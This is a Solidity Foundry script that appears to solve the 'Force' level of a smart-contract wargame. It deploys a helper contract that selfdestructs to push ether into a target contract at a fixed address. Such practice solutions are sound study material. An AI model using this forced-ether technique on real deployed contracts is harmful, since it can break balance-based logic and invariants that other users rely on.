// SPDX-License-Identifier: MIT
// forge script script/Level07ForceSolution.s.sol -vvvv --tc Level07ForceSolution --broadcast
pragma solidity ^0.8.0;

import "../src/Level07Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract selfdestructContract {
    constructor (Force _forceInstance) payable {
        selfdestruct(payable(address(_forceInstance)));
    }
}

contract Level07ForceSolution is Script {
    Force forceInstance = Force(0x2F785b20fdEa09101f5e389E3bD3D51733f8E3E3);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Before force contract balance:", address(forceInstance).balance);
        new selfdestructContract{value: 0.0001 ether}(forceInstance);
        console.log("After force contract balance:", address(forceInstance).balance);
        
        vm.stopBroadcast();
    }

}